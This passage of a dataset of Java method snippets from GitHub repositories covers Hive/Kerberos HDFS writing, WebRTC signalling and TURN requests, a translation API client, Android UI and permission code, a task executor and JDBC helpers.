HiveConf hiveConf = new HiveConf();        hiveConf.setVar(HiveConf.ConfVars.METASTOREURIS, hiveMetaStoreUris);        UserGroupInformation hiveUgi;        if(haveKerberos){            Properties kerberosProps = KerberosUtil.getProperties();            kerberosProps = null == kerberosProps? new Properties() : kerberosProps;            if(StringUtils.isNotBlank(kerberosProps.getProperty(\"kerberos.krb5.path\", \"\"))){                System.setProperty(\"java.security.krb5.conf\", kerberosProps.getProperty(\"kerberos.krb5.path\"));            }            hiveConf.setBoolVar(HiveConf.ConfVars.METASTORE_USE_THRIFT_SASL, true);            hiveConf.set(\"hadoop.security.authentication\", \"kerberos\");            hiveConf.setVar(HiveConf.ConfVars.METASTORE_KERBEROS_PRINCIPAL,                    writerConfig.getString(HIVE_KEBEROS_PRINCIPAL, DEFAULT_HIVE_USER+ \"/_HOST@EXAMPLE.COM\"));            hiveUgi = getUgiByKerberos(hiveConf, this.kerberosPrincipal, this.kerberosKeytabFilePath);        }else{            hiveUgi = getUgiInAuth(this.writerConfig);        }        return hiveUgi.doAs((PrivilegedExceptionAction<Hive>) () -> {            Hive hive1 = Hive.get(hiveConf);            hive1.getMSC();            return hive1;        });    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "addHiveTablePartitions", "params": ["Hive", "String", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void addHiveTablePartitions(Hive hive, String database, String table, String partitionValues) {        try {            String[] parts = partitionValues.split(\",\");            List<String> partVal = Arrays.asList(parts);            org.apache.hadoop.hive.ql.metadata.Table t = hive.getTable(database, table);            Partition partition = new Partition();            partition.setDbName(database);            partition.setTableName(t.getTableName());            StorageDescriptor partitionSd = new StorageDescriptor(t.getSd());            List<FieldSchema> partitionKeys = t.getPartitionKeys();            partitionKeys = partitionKeys.subList(0, partVal.size());            String location = t.getPath().toUri().getPath() + Path.SEPARATOR + Warehouse.makePartName(partitionKeys, partVal);            Path p = new Path(location);            if (!fileSystem.exists(p)) {                //build directory by runtime user                fileSystem.mkdirs(p);            }            partitionSd.setLocation(location);            partition.setSd(partitionSd);            partition.setValues(partVal);            List<Partition> partitions = new ArrayList<>();            partitions.add(partition);            hive.getMSC().add_partitions(partitions, true, true);        } catch (Exception e) {            LOG.error(\"Add table partition error.\", e);            throw DataXException.asDataXException(HdfsWriterErrorCode.ADD_PARTITION_ERROR, e.getMessage());        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "kerberosAuthentication", "params": ["org", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "UserGroupInformation", "snippet": "    private UserGroupInformation kerberosAuthentication(org.apache.hadoop.conf.Configuration conf,                                                        String kerberosPrincipal, String kerberosKeytabFilePath) {        UserGroupInformation ugi = null;        if (StringUtils.isNotBlank(kerberosPrincipal) && StringUtils.isNotBlank(kerberosKeytabFilePath)) {            UserGroupInformation.setConfiguration(conf);            try {                ugi = UserGroupInformation.loginUserFromKeytabAndReturnUGI(kerberosPrincipal                        .substring(0, kerberosPrincipal.indexOf(\"@\")), kerberosKeytabFilePath);            } catch (Exception e) {                String message = String.format(\"kerberos\u8ba4\u8bc1\u5931\u8d25,\u8bf7\u786e\u5b9akerberosKeytabFilePath[%s]\u548ckerberosPrincipal[%s]\u586b\u5199\u6b63\u786e\",                        kerberosKeytabFilePath, kerberosPrincipal);                LOG.error(message);                throw DataXException.asDataXException(HdfsWriterErrorCode.KERBEROS_LOGIN_ERROR, e);            }        }        return ugi;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "detectFileType", "params": ["StorageDescriptor"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String detectFileType(StorageDescriptor tableDescriptor){        //search file type by output format of table/partition        return HiveFileType.output(tableDescriptor.getOutputFormat()) != null ? HiveFileType.output(tableDescriptor.getOutputFormat()).toString() : \"\";    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "makeRequest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void makeRequest() {    Log.d(TAG, \"Connecting to room: \" + roomUrl);    AsyncHttpURLConnection httpConnection =        new AsyncHttpURLConnection(\"POST\", roomUrl, roomMessage, new AsyncHttpEvents() {          @Override          public void onHttpError(String errorMessage) {            Log.e(TAG, \"Room connection error: \" + errorMessage);            events.onSignalingParametersError(errorMessage);          }          @Override          public void onHttpComplete(String response) {            roomHttpResponseParse(response);          }        });    httpConnection.send();  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/RoomParametersFetcher.java", "stars": "2", "class": {"name": "RoomParametersFetcher", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "roomHttpResponseParse", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void roomHttpResponseParse(String response) {    Log.d(TAG, \"Room response: \" + response);    try {      List<IceCandidate> iceCandidates = null;      SessionDescription offerSdp = null;      JSONObject roomJson = new JSONObject(response);      String result = roomJson.getString(\"result\");      if (!result.equals(\"SUCCESS\")) {        events.onSignalingParametersError(\"Room response error: \" + result);        return;      }      response = roomJson.getString(\"params\");      roomJson = new JSONObject(response);      String roomId = roomJson.getString(\"room_id\");      String clientId = roomJson.getString(\"client_id\");      String wssUrl = roomJson.getString(\"wss_url\");      String wssPostUrl = roomJson.getString(\"wss_post_url\");      boolean initiator = (roomJson.getBoolean(\"is_initiator\"));      if (!initiator) {        iceCandidates = new ArrayList<>();        String messagesString = roomJson.getString(\"messages\");        JSONArray messages = new JSONArray(messagesString);        for (int i = 0; i < messages.length(); ++i) {          String messageString = messages.getString(i);          JSONObject message = new JSONObject(messageString);          String messageType = message.getString(\"type\");          Log.d(TAG, \"GAE->C #\" + i + \" : \" + messageString);          if (messageType.equals(\"offer\")) {            offerSdp = new SessionDescription(                SessionDescription.Type.fromCanonicalForm(messageType), message.getString(\"sdp\"));          } else if (messageType.equals(\"candidate\")) {            IceCandidate candidate = new IceCandidate(                message.getString(\"id\"), message.getInt(\"label\"), message.getString(\"candidate\"));            iceCandidates.add(candidate);          } else {            Log.e(TAG, \"Unknown message: \" + messageString);          }        }      }      Log.d(TAG, \"RoomId: \" + roomId + \". ClientId: \" + clientId);      Log.d(TAG, \"Initiator: \" + initiator);      Log.d(TAG, \"WSS url: \" + wssUrl);      Log.d(TAG, \"WSS POST url: \" + wssPostUrl);      List<PeerConnection.IceServer> iceServers =          iceServersFromPCConfigJSON(roomJson.getString(\"pc_config\"));      boolean isTurnPresent = false;      for (PeerConnection.IceServer server : iceServers) {        Log.d(TAG, \"IceServer: \" + server);        for (String uri : server.urls) {          if (uri.startsWith(\"turn:\")) {            isTurnPresent = true;            break;          }        }      }      // Request TURN servers.      if (!isTurnPresent && !roomJson.optString(\"ice_server_url\").isEmpty()) {        List<PeerConnection.IceServer> turnServers =            requestTurnServers(roomJson.getString(\"ice_server_url\"));        for (PeerConnection.IceServer turnServer : turnServers) {          Log.d(TAG, \"TurnServer: \" + turnServer);          iceServers.add(turnServer);        }      }      SignalingParameters params = new SignalingParameters(          iceServers, initiator, clientId, wssUrl, wssPostUrl, offerSdp, iceCandidates);      events.onSignalingParametersReady(params);    } catch (JSONException e) {      events.onSignalingParametersError(\"Room JSON parsing error: \" + e.toString());    } catch (IOException e) {      events.onSignalingParametersError(\"Room IO error: \" + e.toString());    }  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/RoomParametersFetcher.java", "stars": "2", "class": {"name": "RoomParametersFetcher", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "requestTurnServers", "params": ["String"], "throws": ["IOException", "JSONException"], "modifiers": ["private"], "return_type": "List<PeerConnection>", "snippet": "  private List<PeerConnection.IceServer> requestTurnServers(String url)      throws IOException, JSONException {    List<PeerConnection.IceServer> turnServers = new ArrayList<>();    Log.d(TAG, \"Request TURN from: \" + url);    HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();    connection.setDoOutput(true);    connection.setRequestProperty(\"REFERER\", \"https://appr.tc\");    connection.setConnectTimeout(TURN_HTTP_TIMEOUT_MS);    connection.setReadTimeout(TURN_HTTP_TIMEOUT_MS);    int responseCode = connection.getResponseCode();    if (responseCode != 200) {      throw new IOException(\"Non-200 response when requesting TURN server from \" + url + \" : \"          + connection.getHeaderField(null));    }    InputStream responseStream = connection.getInputStream();    String response = drainStream(responseStream);    connection.disconnect();    Log.d(TAG, \"TURN response: \" + response);    JSONObject responseJSON = new JSONObject(response);    JSONArray iceServers = responseJSON.getJSONArray(\"iceServers\");    for (int i = 0; i < iceServers.length(); ++i) {      JSONObject server = iceServers.getJSONObject(i);      JSONArray turnUrls = server.getJSONArray(\"urls\");      String username = server.has(\"username\") ? server.getString(\"username\") : \"\";      String credential = server.has(\"credential\") ? server.getString(\"credential\") : \"\";      for (int j = 0; j < turnUrls.length(); j++) {        String turnUrl = turnUrls.getString(j);        PeerConnection.IceServer turnServer =            PeerConnection.IceServer.builder(turnUrl)              .setUsername(username)              .setPassword(credential)              .createIceServer();        turnServers.add(turnServer);      }    }    return turnServers;  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/RoomParametersFetcher.java", "stars": "2", "class": {"name": "RoomParametersFetcher", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "iceServersFromPCConfigJSON", "params": ["String"], "throws": ["JSONException"], "modifiers": ["private"], "return_type": "List<PeerConnection>", "snippet": "  private List<PeerConnection.IceServer> iceServersFromPCConfigJSON(String pcConfig)      throws JSONException {    JSONObject json = new JSONObject(pcConfig);    JSONArray servers = json.getJSONArray(\"iceServers\");    List<PeerConnection.IceServer> ret = new ArrayList<>();    for (int i = 0; i < servers.length(); ++i) {      JSONObject server = servers.getJSONObject(i);      String url = server.getString(\"urls\");      String credential = server.has(\"credential\") ? server.getString(\"credential\") : \"\";        PeerConnection.IceServer turnServer =            PeerConnection.IceServer.builder(url)              .setPassword(credential)              .createIceServer();      ret.add(turnServer);    }    return ret;  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/RoomParametersFetcher.java", "stars": "2", "class": {"name": "RoomParametersFetcher", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "drainStream", "params": ["InputStream"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "  private static String drainStream(InputStream in) {    Scanner s = new Scanner(in, \"UTF-8\").useDelimiter(\"\\\\A\");    return s.hasNext() ? s.next() : \"\";  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/RoomParametersFetcher.java", "stars": "2", "class": {"name": "RoomParametersFetcher", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getTransResult", "params": ["String", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTransResult(String query, String from, String to) {        Map<String, String> params = buildParams(query, from, to);        return HttpGet.get(TRANS_API_HOST, params);    }", "url": "https://raw.githubusercontent.com/LeonRain/wangwang/master/wangwang/src/main/java/com/baidu/translate/demo/TransApi.java", "stars": "1", "class": {"name": "TransApi", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "buildParams", "params": ["String", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "Map<String,String>", "snippet": "    private Map<String, String> buildParams(String query, String from, String to) {        Map<String, String> params = new HashMap<String, String>();        params.put(\"q\", query);        params.put(\"from\", from);        params.put(\"to\", to);        params.put(\"appid\", appid);        // \u968f\u673a\u6570        String salt = String.valueOf(System.currentTimeMillis());        params.put(\"salt\", salt);        // \u7b7e\u540d        String src = appid + query + salt + securityKey; // \u52a0\u5bc6\u524d\u7684\u539f\u6587        params.put(\"sign\", MD5.md5(src));        return params;    }", "url": "https://raw.githubusercontent.com/LeonRain/wangwang/master/wangwang/src/main/java/com/baidu/translate/demo/TransApi.java", "stars": "1", "class": {"name": "TransApi", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "inicializar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void inicializar() {\t\tdao = new UsuarioDao();\t\tbuscarUsuarios();\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/PesquisaUsuarioBean.java", "stars": "1", "class": {"name": "PesquisaUsuarioBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "excluir", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void excluir() {\t\tdao.excluir(usuarioSelecionado);\t\tbuscarUsuarios();\t\tFacesUtil.addInfoMessage(\"Usuario excluido com sucesso\");\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/PesquisaUsuarioBean.java", "stars": "1", "class": {"name": "PesquisaUsuarioBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "buscarUsuarios", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void buscarUsuarios() {\t\tusuarios = dao.buscarTodos();\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/PesquisaUsuarioBean.java", "stars": "1", "class": {"name": "PesquisaUsuarioBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getUsuarios", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Usuario>", "snippet": "\tpublic List<Usuario> getUsuarios() {\t\treturn usuarios;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/PesquisaUsuarioBean.java", "stars": "1", "class": {"name": "PesquisaUsuarioBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDao", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UsuarioDao", "snippet": "\tpublic UsuarioDao getDao() {\t\treturn dao;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/PesquisaUsuarioBean.java", "stars": "1", "class": {"name": "PesquisaUsuarioBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setDao", "params": ["UsuarioDao"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDao(UsuarioDao dao) {\t\tthis.dao = dao;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/PesquisaUsuarioBean.java", "stars": "1", "class": {"name": "PesquisaUsuarioBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getUsuarioSelecionado", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Usuario", "snippet": "\tpublic Usuario getUsuarioSelecionado() {\t\treturn usuarioSelecionado;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/PesquisaUsuarioBean.java", "stars": "1", "class": {"name": "PesquisaUsuarioBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setUsuarioSelecionado", "params": ["Usuario"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setUsuarioSelecionado(Usuario usuarioSelecionado) {\t\tthis.usuarioSelecionado = usuarioSelecionado;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/PesquisaUsuarioBean.java", "stars": "1", "class": {"name": "PesquisaUsuarioBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setUsuarios", "params": ["List<Usuario>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setUsuarios(List<Usuario> usuarios) {\t\tthis.usuarios = usuarios;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/PesquisaUsuarioBean.java", "stars": "1", "class": {"name": "PesquisaUsuarioBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "method", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void method() {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/aop/PermissionsAspect.java", "stars": "1", "class": {"name": "PermissionsAspect", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "aroundJoinPoint", "params": ["ProceedingJoinPoint", "Permissions"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void aroundJoinPoint(final ProceedingJoinPoint joinPoint, Permissions permissions) {        XXPermissions.with(ActivityStackManager.getInstance().getTopActivity())                .permission(permissions.value())                .request(new OnPermission() {                    @Override                    public void hasPermission(List<String> granted, boolean all) {                        if (all) {                            try {                                // \u83b7\u5f97\u6743\u9650\uff0c\u6267\u884c\u539f\u65b9\u6cd5                                joinPoint.proceed();                            } catch (Throwable e) {                                e.printStackTrace();                            }                        }                    }                    @Override                    public void noPermission(List<String> denied, boolean quick) {                        if (quick) {                            ToastUtils.show(R.string.common_permission_fail);                            XXPermissions.gotoPermissionSettings(ActivityStackManager.getInstance().getTopActivity(), false);                        } else {                            ToastUtils.show(R.string.common_permission_hint);                        }                    }                });    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/aop/PermissionsAspect.java", "stars": "1", "class": {"name": "PermissionsAspect", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "register", "params": ["Task"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void register(Task task) {        tasksByIdentifier.put(task.getName(), task);    }", "url": "https://raw.githubusercontent.com/oliverselinger/failsafe-executor/master/src/main/java/os/failsafe/executor/Workers.java", "stars": "2", "class": {"name": "Workers", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "execute", "params": ["TaskInstance"], "throws": null, "modifiers": ["public"], "return_type": "Future<String>", "snippet": "    public Future<String> execute(TaskInstance taskInstance) {        idleWorkerCount.decrementAndGet();        return workers.submit(() -> runTask(taskInstance));    }", "url": "https://raw.githubusercontent.com/oliverselinger/failsafe-executor/master/src/main/java/os/failsafe/executor/Workers.java", "stars": "2", "class": {"name": "Workers", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "runTask", "params": ["TaskInstance"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String runTask(TaskInstance taskInstance) {        try {            Task task = tasksByIdentifier.get(taskInstance.name);            task.execute(taskInstance.parameter);            task.notifyListeners(taskInstance.id);            taskInstance.delete();        } catch (Exception e) {            taskInstance.fail(e);        } finally {            idleWorkerCount.incrementAndGet();        }        return taskInstance.id;    }", "url": "https://raw.githubusercontent.com/oliverselinger/failsafe-executor/master/src/main/java/os/failsafe/executor/Workers.java", "stars": "2", "class": {"name": "Workers", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "allWorkersBusy", "params": [], "throws": null, "modifiers": [], "return_type": "boolean", "snippet": "    boolean allWorkersBusy() {        return !(idleWorkerCount.get() > 0);    }", "url": "https://raw.githubusercontent.com/oliverselinger/failsafe-executor/master/src/main/java/os/failsafe/executor/Workers.java", "stars": "2", "class": {"name": "Workers", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "stop", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void stop() {        this.workers.shutdown();    }", "url": "https://raw.githubusercontent.com/oliverselinger/failsafe-executor/master/src/main/java/os/failsafe/executor/Workers.java", "stars": "2", "class": {"name": "Workers", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "setData", "params": ["List<AlbumBean>"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setData(List<AlbumBean> data) {            mAdapter.setData(data);            // \u6eda\u52a8\u5230\u9009\u4e2d\u7684\u4f4d\u7f6e            for (int i = 0; i < data.size(); i++) {                if (data.get(i).isSelect()) {                    mRecyclerView.scrollToPosition(i);                }            }            return this;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AlbumDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "BaseDialog", "implements": ["BaseAdapter"], "modifiers": ["public", "final", "static"]}}, {"method_name": "setListener", "params": ["OnListener"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setListener(OnListener listener) {            mListener = listener;            return this;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AlbumDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "BaseDialog", "implements": ["BaseAdapter"], "modifiers": ["public", "final", "static"]}}, {"method_name": "onItemClick", "params": ["RecyclerView", "View", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onItemClick(RecyclerView recyclerView, View itemView, int position) {            List<AlbumBean> data = mAdapter.getData();            if (data == null) {                return;            }            for (AlbumBean bean : data) {                if (bean.isSelect()) {                    bean.setSelect(false);                    break;                }            }            mAdapter.getItem(position).setSelect(true);            mAdapter.notifyDataSetChanged();            // \u5ef6\u8fdf\u6d88\u5931            postDelayed(() -> {                if (mListener != null) {                    mListener.onSelected(getDialog(), position, mAdapter.getItem(position));                }                dismiss();            }, 300);        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AlbumDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "BaseDialog", "implements": ["BaseAdapter"], "modifiers": ["public", "final", "static"]}}, {"method_name": "onCreateViewHolder", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "ViewHolder", "snippet": "        public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {            return new ViewHolder();        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AlbumDialog.java", "stars": "1", "class": {"name": "AlbumAdapter", "extends": "MyAdapter", "implements": null, "modifiers": ["private", "static", "final"]}}, {"method_name": "onBindView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void onBindView(int position) {                AlbumBean bean = getItem(position);                GlideApp.with(getContext())                        .load(bean.getIcon())                        .into(mIconView);                mNameView.setText(bean.getName());                mCountView.setText(String.format(getString(R.string.photo_total), bean.getCount()));                mCheckBox.setChecked(bean.isSelect());                mCheckBox.setVisibility(bean.isSelect() ? View.VISIBLE : View.INVISIBLE);            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AlbumDialog.java", "stars": "1", "class": {"name": "ViewHolder", "extends": "MyAdapter", "implements": null, "modifiers": ["final"]}}, {"method_name": "setName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setName(String name) {            this.name = name;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AlbumDialog.java", "stars": "1", "class": {"name": "AlbumBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setSelect", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setSelect(boolean select) {            this.select = select;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AlbumDialog.java", "stars": "1", "class": {"name": "AlbumBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getIcon", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getIcon() {            return icon;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AlbumDialog.java", "stars": "1", "class": {"name": "AlbumBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getName() {            return name;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AlbumDialog.java", "stars": "1", "class": {"name": "AlbumBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getCount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int getCount() {            return count;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AlbumDialog.java", "stars": "1", "class": {"name": "AlbumBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "isSelect", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isSelect() {            return select;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AlbumDialog.java", "stars": "1", "class": {"name": "AlbumBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "get", "params": ["Context"], "throws": ["IllegalStateException"], "modifiers": ["synchronized", "public", "static"], "return_type": "LibVLC", "snippet": "    public synchronized static LibVLC get(Context context) throws IllegalStateException {        if (sLibVLC == null) {            if(!VLCUtil.hasCompatibleCPU(context)) {                Timber.e(VLCUtil.getErrorMsg());                throw new IllegalStateException(\"LibVLC initialisation failed: \" + VLCUtil.getErrorMsg());            }            String chroma = PrefUtils.get(context, Prefs.PIXEL_FORMAT, \"\");            sLibVLC = new LibVLC(VLCOptions.getLibOptions(context, true, \"UTF-8\", true, chroma, BuildConfig.DEBUG));        }        return sLibVLC;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/vlc/VLCInstance.java", "stars": "4", "class": {"name": "VLCInstance", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "restart", "params": ["Context"], "throws": ["IllegalStateException"], "modifiers": ["synchronized", "public", "static"], "return_type": "void", "snippet": "    public static synchronized void restart(Context context) throws IllegalStateException {        if (sLibVLC != null) {            sLibVLC.release();            String chroma = PrefUtils.get(context, Prefs.PIXEL_FORMAT, \"\");            sLibVLC = new LibVLC(VLCOptions.getLibOptions(context, true, \"UTF-8\", true, chroma, BuildConfig.DEBUG));        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/vlc/VLCInstance.java", "stars": "4", "class": {"name": "VLCInstance", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hasCompatibleCPU", "params": ["Context"], "throws": null, "modifiers": ["synchronized", "public", "static"], "return_type": "boolean", "snippet": "    public static synchronized boolean hasCompatibleCPU(Context context) {        return !(sLibVLC == null && !VLCUtil.hasCompatibleCPU(context));    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/vlc/VLCInstance.java", "stars": "4", "class": {"name": "VLCInstance", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "registerErrorPages", "params": ["ErrorPageRegistry"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void registerErrorPages(ErrorPageRegistry registry) {        ErrorPage error404Page = new ErrorPage(HttpStatus.NOT_FOUND, \"/static/index.html\");        registry.addErrorPages(error404Page);    }", "url": "https://raw.githubusercontent.com/lixiangwudi/service/master/src/main/java/com/example/lx/error/ErrorConfig.java", "stars": "2", "class": {"name": "ErrorConfig", "extends": null, "implements": ["ErrorPageRegistrar"], "modifiers": ["public"]}}, {"method_name": "getConnection", "params": [], "throws": ["SQLException"], "modifiers": ["public", "static"], "return_type": "Connection", "snippet": "    public static Connection getConnection() throws SQLException {        return ds.getConnection();    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/jdbc/datasource/utils/JDBCUtils.java", "stars": "2", "class": {"name": "JDBCUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "close", "params": ["Statement", "Connection"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void close(Statement stmt, Connection conn) {        if(stmt != null) {            try {                stmt.close();            } catch (SQLException throwables) {                throwables.printStackTrace();            }        }        if(conn != null) {            try {                conn.close();            } catch (SQLException throwables) {                throwables.printStackTrace();            }        }    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/jdbc/datasource/utils/JDBCUtils.java", "stars": "2", "class": {"name": "JDBCUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "close", "params": ["ResultSet", "Statement", "Connection"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static 